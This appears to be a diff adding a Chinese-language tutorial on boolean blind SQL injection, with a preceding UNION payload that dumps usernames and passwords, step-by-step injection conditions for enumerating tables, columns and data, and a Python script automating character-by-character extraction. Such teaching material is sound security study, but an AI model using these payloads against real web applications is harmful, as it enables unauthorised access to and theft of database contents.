@@ -275,5 +275,79 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 ?id=-1' UNION SELECT 1,group_concat(username),group_concat(password) FROM database_name.table_name --+
 ```
 
+---
 
+#### 2. 布尔盲注（Boolean Blind Injection）
 
+##### 2.1 原理
+布尔盲注适用于**页面无数据回显**，但可以根据 SQL 条件真假呈现不同页面内容（例如正常页面 vs 空白页面，或出现不同提示文字）的场景。攻击者通过构造 `and [条件]` 形式的注入语句，利用页面状态的差异，逐位推断数据库中的数据。
+
+##### 2.2 适用条件
+- 存在 SQL 注入漏洞。
+- 页面没有回显位（不能使用 `union select` 直接输出数据）。
+- 页面存在明显的“真/假”状态差异（比如：条件为真时显示正常内容，为假时无内容或报错）。
+
+##### 2.3 核心函数
+| 函数 | 作用 | 布尔盲注中的典型用法 |
+|------|------|----------------------|
+| `length(str)` | 返回字符串长度 | `length(目标表达式) = N` 判断长度是否为 N |
+| `substr(str, pos, len)` | 截取子串 | `substr(目标表达式, 位置, 1)` 取单个字符 |
+| `ascii(char)` | 返回字符 ASCII 码 | `ascii(单字符) = 码值` 判断字符 |
+| `count(*)` | 统计行数 | 获取表或列的数量 |
+
+##### 2.4 通用获取步骤
+
+**1. 确定目标字符串长度**
+```sql
+and length((子查询)) = N
+```
+
+从 N=1 开始递增，直到页面正常，即获得长度 L。
+
+**2. 逐字符获取内容**
+
+```sql
+and ascii(substr(子查询, 位置, 1)) = ASCII码
+```
+
+- 位置从 1 到 L。
+- ASCII码 从 32（空格）到 126（`~`）遍历，命中时记录字符。
+- 最终拼接出完整字符串。
+
+**3. 枚举数据（表名、列名、数据）**
+
+- 表名：子查询为 `select table_name from information_schema.tables where table_schema=database() limit N,1`
+- 列名：子查询为 `select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit N,1`
+- 数据：子查询为 `select 列名 from 表名 limit N,1`
+
+> **`limit N,1` 的作用**：跳过 N 条记录，取接下来的 1 条记录。这样可以通过改变 N 的值（0,1,2,...）依次获取每条数据。
+
+##### 2.5 效率与自动化
+
+- 通常借助脚本或工具（如 sqlmap）实现自动化。
+- 脚本核心逻辑（伪代码）：
+
+```python
+# 以单引号字符型为例，实际使用时根据注入点调整闭合前缀和注释符
+def test(condition):
+    payload = f"1' and {condition} #"
+    return "成功标志" in requests.get(url, params={"id": payload}).text
+
+# 获取长度
+for i in range(1, 31):
+    if test(f"length((子查询)) = {i}"):
+        length = i; break
+
+# 获取字符串
+result = ""
+for pos in range(1, length+1):
+    for code in range(32, 127):
+        if test(f"ascii(substr((子查询), {pos}, 1)) = {code}"):
+            result += chr(code); break
+```
+
+##### 2.6 注意事项
+
+- 注释符推荐使用 `#`（在 URL 中会被正确编码为 `%23`），避免 `--+` 的编码问题。
+- 如果目标字符串可能包含非打印字符或中文，ASCII 范围可扩展至 0~255，但请求量会增加。
+- 实际测试中可先用**二分法**优化 ASCII 遍历，减少请求次数。
